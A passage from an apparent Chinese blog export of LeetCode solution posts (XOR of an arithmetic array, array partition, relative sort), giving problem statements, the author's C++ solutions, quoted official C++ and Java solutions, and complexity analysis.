    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/xor-operation-in-an-array/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个整数，<code>n</code> 和 <code>start</code> 。</p>
<p>数组 <code>nums</code> 定义为：<code>nums[i] = start + 2*i</code>（下标从 0 开始）且 <code>n == nums.length</code> 。</p>
<p>请返回 <code>nums</code> 中所有元素按位异或（<strong>XOR</strong>）后得到的结果。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 5, start &#x3D; 0</span><br><span class="line">输出：8</span><br><span class="line">解释：数组 nums 为 [0, 2, 4, 6, 8]，其中 (0 ^ 2 ^ 4 ^ 6 ^ 8) &#x3D; 8 。</span><br><span class="line">     &quot;^&quot; 为按位异或 XOR 运算符。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4, start &#x3D; 3</span><br><span class="line">输出：8</span><br><span class="line">解释：数组 nums 为 [3, 5, 7, 9]，其中 (3 ^ 5 ^ 7 ^ 9) &#x3D; 8.</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1, start &#x3D; 7</span><br><span class="line">输出：7</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 10, start &#x3D; 5</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 1000</code></li>
<li><code>0 &lt;= start &lt;= 1000</code></li>
<li><code>n == nums.length</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>对循环得到的元素值进行异或。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.2M，击败10.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">xorOperation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=start;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result^=start+<span class="number">2</span>*i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/xor-operation-in-an-array/solution/shu-zu-yi-huo-cao-zuo-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：模拟</strong><br><strong>思路</strong></p>
<p>按照题意模拟即可：</p>
<ul>
<li>初始化 \rm ans = 0ans=0</li>
<li>遍历区间 $[0, n - 1]$中的每一个整数$i$，令 $ans$与每一个R$start+2i$ 做异或运算</li>
<li>最终返回 $ans$，即我们需要的答案</li>
</ul>
<p><strong>代码：</strong>（执行0s，击败100%，内存6.1M，击败17.68%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">xorOperation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            ans ^= (start + i * <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。这里用一重循环对 $n$ 个数字进行异或。</li>
<li>空间复杂度：$O(1)$。这里只是用了常量级别的辅助空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我的答案和官方题解一样，这个执行用时内存消耗什么的每次都会有微小的差异，这个没关系的，继续加油吧🤔!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组拆分</title>
    <url>/2020/11/19/%E6%95%B0%E7%BB%84%E6%8B%86%E5%88%86I/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/array-partition-i/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定长度为 <code>2n</code> 的整数数组 <code>nums</code> ，你的任务是将这些数分成 <code>n</code> 对, 例如 <code>(a1, b1), (a2, b2), ..., (an, bn)</code> ，使得从 <code>1</code> 到 <code>n</code> 的 <code>min(ai, bi)</code> 总和最大。</p>
<p>返回该 <strong>最大总和</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,4,3,2]</span><br><span class="line">输出：4</span><br><span class="line">解释：所有可能的分法（忽略元素顺序）为：</span><br><span class="line">1. (1, 4), (2, 3) -&gt; min(1, 4) + min(2, 3) &#x3D; 1 + 2 &#x3D; 3</span><br><span class="line">2. (1, 3), (2, 4) -&gt; min(1, 3) + min(2, 4) &#x3D; 1 + 2 &#x3D; 3</span><br><span class="line">3. (1, 2), (3, 4) -&gt; min(1, 2) + min(3, 4) &#x3D; 1 + 3 &#x3D; 4</span><br><span class="line">所以最大总和为 4</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [6,2,6,5,1,2]</span><br><span class="line">输出：9</span><br><span class="line">解释：最优的分法为 (2, 1), (2, 5), (6, 6). min(2, 1) + min(2, 5) + min(6, 6) &#x3D; 1 + 2 + 6 &#x3D; 9</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 10^4</code></li>
<li><code>nums.length == 2 * n</code></li>
<li><code>-10^4 &lt;= nums[i] &lt;= 10^4</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目就是要把数组中的元素两两分组，尽量使每一组的最小值大一些，思考怎么分组？</p>
<p>其实就是把数组中的两个最小值分到一起，然后对剩下的元素也是挑选最小的两个值分组。</p>
<p>既然这样，只要对数组进行升序排序，然后累加偶数位置的元素值返回就好了。</p>
<p><strong>c++代码：</strong>(执行用时168ms，击败46.71%，内存消耗27.8M，击败18.66%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">int</span> n=nums.size();</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">            result+=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/array-partition-i/solution/shu-zu-chai-fen-i-by-leetcode/">官方题解</a>:</h6><p><strong>方法一 暴力求解 [超过时间限制]</strong></p>
<p><strong>算法</strong></p>
<p>最简单的解决方案是考虑 $nums$ 数组的元素每个可能的配对集。为了生成所有可能的配对，我们使用函数 <code>permute(nums,current_index)</code>。此函数创建给定数组元素的所有可能排列。</p>
<p>为此，<code>permute</code>将当前元素 <code>current_index</code>的索引作为参数之一，然后，它将当前元素与数组中的每个其他元素交换，向右移动，以便生成数组元素的新排序。在完成交换之后，它再次调用 <code>permute</code>，但这次使用数组中下一个元素的索引。返回时，我们反转当前函数调用中的交换。</p>
<p>因此，当到达数组的末尾时，会生成数组元素的新排序。考虑配对的元素，使得每对的第一个元素来自新数组的前半部分，第二个元素来自数组的后半部分。因此，我们总结了所有这些可能配对中的最小元素，并找出它们的最大总和。</p>
<p>下面的动画描述了排列的生成方式。</p>
<p><img src="/2020/11/19/%E6%95%B0%E7%BB%84%E6%8B%86%E5%88%86I/561_ArraySlide11.PNG" alt="img"></p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max_sum = Integer.MIN_VALUE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        permute(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> max_sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">permute</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                sum += Math.min(nums[i], nums[nums.length / <span class="number">2</span> + i]);</span><br><span class="line">            &#125;</span><br><span class="line">            max_sum = Math.max(max_sum, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt; nums.length; i++) &#123;</span><br><span class="line">            swap(nums, i, l);</span><br><span class="line">            permute(nums, l + <span class="number">1</span>);</span><br><span class="line">            swap(nums, i, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = nums[x];</span><br><span class="line">        nums[x] = nums[y];</span><br><span class="line">        nums[y] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n!)$。对于数组中的 $n$ 元素，总共可以 $n$ 排列。</p>
</li>
<li><p>空间复杂度：$O(1)$。仅需使用常数级的额外空间。</p>
</li>
</ul>
<p><strong>方法二 排序 [通过]</strong><br><strong>算法</strong></p>
<p>为了理解这种方法，让我们从不同的角度来看待问题。我们需要形成数组元素的配对，使得这种配对中最小的总和最大。因此，我们可以查看选择配对中最小值的操作，比如 $(a,b)$ 可能会产生的最大损失 $a-b$ (如果 $a &gt; b$)。</p>
<p>如果这类配对产生的总损失最小化，那么总金额现在将达到最大值。只有当为配对选择的数字比数组的其他元素更接近彼此时，才有可能将每个配对中的损失最小化。</p>
<p>考虑到这一点，我们可以对给定数组的元素进行排序，并直接按排序顺序形成元素的配对。这将导致元素的配对，它们之间的差异最小，从而导致所需总和的最大化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复杂度分析</p>
<ul>
<li><p>时间复杂度：$O\big(nlog(n)\big)$。排序需要 $O\big(nlog(n)\big)$的时间。另外会有一次数组的遍历。</p>
</li>
<li><p>空间复杂度：$O(1)$。仅仅需要常数级的空间.</p>
</li>
</ul>
<p><strong>方法三 使用额外的空间 [通过]</strong></p>
<p><strong>算法</strong></p>
<p>这种方法在某种程度上与排序方法有关。由于给定数组中的元素范围有限 [-10000, 10000]，我们可以使用 $arr$ 的哈希表，这样 $arr [i]$ 存储 $（i-10000）^ {th}$元素的出现频率。 这个减法操作可以保证这个哈希表可以能够存下范围内的所有数字。</p>
<p>因此，现在我们可以直接以递增的顺序遍历哈希表，而不是对数组的元素进行排序。但是，任何元素也可能在给定数组中多次出现。我们需要考虑这个因素。</p>
<p>为此，考虑一个例子：<code>nums：[a，b，a，b，b，a]</code>。这个数组的排序顺序是 <code>nums_sorted：[a，a，a，b，b，b]</code>。（我们实际上并没有在这种方法中对数组进行排序，但是排序的数组仅用于演示）。从前面的方法，我们知道所需的配对集是 （a，a），（a，b），（b，b）（a，a），（a，b），（b，b）。现在，我们可以看到，在选择最小元素时，$a$ 将被选择两次，$b$ 将仅被选择一次。发生这种情况是因为要选择的 $a$ 的数量已经由 $a$ 的频率确定，其余的地方将由 $b$ 填补。这是因为，为了得到正确的结果，我们需要按升序考虑元素。因此，较低的数字总是优先被添加到最终结果。</p>
<p>但是，如果排序的元素采用以下形式：<code>nums_sorted：[a，a，b，b，b，b]</code>，正确的配对将是 （a，a），（b，b），（b，b） ）（a，a），（b，b），（b，b））。同样，在这种情况下，所选择的$a$的数量已经预先确定，但由于 $a$ 的数量是奇数，因此它不会影响最终总和中 $b$的选择。</p>
<p>因此，基于上面的讨论，我们遍历哈希表 $arr$。如果当前元素出现 $req_i$ 次，并且其中一个元素与右边区域中的其他元素配对（考虑虚拟排序数组），我们考虑当前元素 $\left\lceil\frac{freq_i}{2}\right\rceil$次数以及数组中出现的下一个元素 $\left\lfloor\frac {freq_j}{2}\right\rfloor$最终总和的次数。为了传播这个左边对所选数字的影响，我们使用了一个标志 $d$。如果当前集合中有剩余元素将被再次考虑，则此标志设置为 1。在从下一组中选择元素时，会考虑已考虑的相同额外元素。</p>
<p>在遍历哈希表时，我们确定需要考虑每个元素的正确次数，如上所述。请注意，如果数组中不存在哈希表的当前元素，则标志 $d$ 和 $sum$保持不变。</p>
<p>下面的代码受到 @fallcreek的启发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayPairSum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">20001</span>];</span><br><span class="line">        <span class="keyword">int</span> lim = <span class="number">10000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums)</span><br><span class="line">            arr[num + lim]++;</span><br><span class="line">        <span class="keyword">int</span> d = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = -<span class="number">10000</span>; i &lt;= <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            sum += (arr[i + lim] + <span class="number">1</span> - d) / <span class="number">2</span> * i;</span><br><span class="line">            d = (<span class="number">2</span> + arr[i + lim] - d) % <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$。需要遍历一次哈希表 $arr$。</p>
</li>
<li><p>空间复杂度：。存储一个大小为$n$哈希表 $arr$ 所需要的空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解给出答案都是用Java实现的，看来写题解的是做Java的，哈哈哈。官方题解给出了三种解题思路，其中暴力求解不可用（超出时间限制且实现复杂），排序这种方法简洁易懂效率也不错，我用的也是这种方法。第三种方法“使用额外的空间”其实好像就是计数法，真的是不同的人不同的叫法，实现起来好像也挺复杂的，暂时没看懂也没仔细看，留作后续补充，太累了，顶不住了💔。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组的相对排序</title>
    <url>/2020/11/14/%E6%95%B0%E7%BB%84%E7%9A%84%E7%9B%B8%E5%AF%B9%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/relative-sort-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个数组，arr1 和 arr2，</p>
<p>arr2 中的元素各不相同<br>arr2 中的每个元素都出现在 arr1 中<br>对 arr1 中的元素进行排序，使 arr1 中项的相对顺序和 arr2 中的相对顺序相同。未在 arr2 中出现过的元素需要按照升序放在 arr1 的末尾。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr1 &#x3D; [2,3,1,3,2,4,6,7,9,2,19], arr2 &#x3D; [2,1,4,3,9,6]</span><br><span class="line">输出：[2,2,2,1,4,3,3,9,6,7,19]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>arr1.length, arr2.length &lt;= 1000</code></li>
<li><code>0 &lt;= arr1[i], arr2[i] &lt;= 1000</code></li>
<li><code>arr2</code> 中的元素 <code>arr2[i]</code> 各不相同</li>
<li><code>arr2</code> 中的每个元素 <code>arr2[i]</code> 都出现在 <code>arr1</code> 中</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组arr2，对每一个元素在数组arr1中查找，若找到则添加到结果中并从arr1中删除。最后arr1中都是不在arr2中的元素，升序放在结果的末尾。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败22.04%，内存消耗8M，击败9.72%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="comment">//遍历arr2中的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr2.size();++i)&#123;</span><br><span class="line">            <span class="comment">//在arr1中查找该元素</span></span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">            <span class="keyword">while</span>((it=find(arr1.begin(),arr1.end(),arr2[i]))!=arr1.end())&#123;</span><br><span class="line">                result.push_back(arr2[i]);</span><br><span class="line">                <span class="comment">//删除arr1中该元素，继续查找</span></span><br><span class="line">                arr1.erase(it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//现在arr1中都是未在arr2中出现过的元素</span></span><br><span class="line">        <span class="comment">//升序排序</span></span><br><span class="line">        sort(arr1.begin(),arr1.end());</span><br><span class="line">        <span class="comment">//放在最后</span></span><br><span class="line">        result.insert(result.end(),arr1.begin(),arr1.end());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/relative-sort-array/solution/shu-zu-de-xiang-dui-pai-xu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：自定义排序</strong></p>
<p>一种容易想到的方法是使用排序并自定义比较函数。</p>
<p>由于数组 $\textit{arr}_2$  规定了比较顺序，因此我们可以使用哈希表对该顺序进行映射：即对于数组 $\textit{arr}_2$ 中的第 $i$ 个元素，我们将 $(\textit{arr}_2[i], i)$ 这一键值对放入哈希表 $\textit{rank}$中，就可以很方便地对数组 $\textit{arr}_1$中的元素进行比较。</p>
<p>比较函数的写法有很多种，例如我们可以使用最基础的比较方法，对于元素 $x$ 和$y$：</p>
<ul>
<li>如果 $x$ 和 $y$ 都出现在哈希表中，那么比较它们对应的值 $\textit{rank}[x]$和 $\textit{rank}[y]$；</li>
<li>如果 $x$ 和 $y$ 都没有出现在哈希表中，那么比较它们本身；</li>
<li>对于剩余的情况，出现在哈希表中的那个元素较小。</li>
</ul>
<p><strong>c++代码：</strong>(执行用时8ms，击败56.78%，内存消耗8M，击败9.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rank;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr2.size(); ++i) &#123;</span><br><span class="line">            rank[arr2[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr1.begin(), arr1.end(), [&amp;](<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line">            <span class="keyword">if</span> (rank.count(x)) &#123;</span><br><span class="line">                <span class="keyword">return</span> rank.count(y) ? rank[x] &lt; rank[y] : <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> rank.count(y) ? <span class="literal">false</span> : x &lt; y;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>很多语言支持对「元组」进行排序，即依次比较元组中每一个对应位置的元素，直到比较出大小关系为止。因此，对于元素 $x$，如果它出现在哈希表中，我们使用二元组 $(0, \textit{rank}[x])$；如果它没有出现在哈希表中，我们使用二元组 $(1, x)$，就可以得到正确的排序结果。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rank;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr2.size(); ++i) &#123;</span><br><span class="line">            rank[arr2[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> mycmp = [&amp;](<span class="keyword">int</span> x) -&gt; <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> rank.count(x) ? <span class="built_in">pair</span>&#123;<span class="number">0</span>, rank[x]&#125; : <span class="built_in">pair</span>&#123;<span class="number">1</span>, x&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        sort(arr1.begin(), arr1.end(), [&amp;](<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line">            <span class="keyword">return</span> mycmp(x) &lt; mycmp(y);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
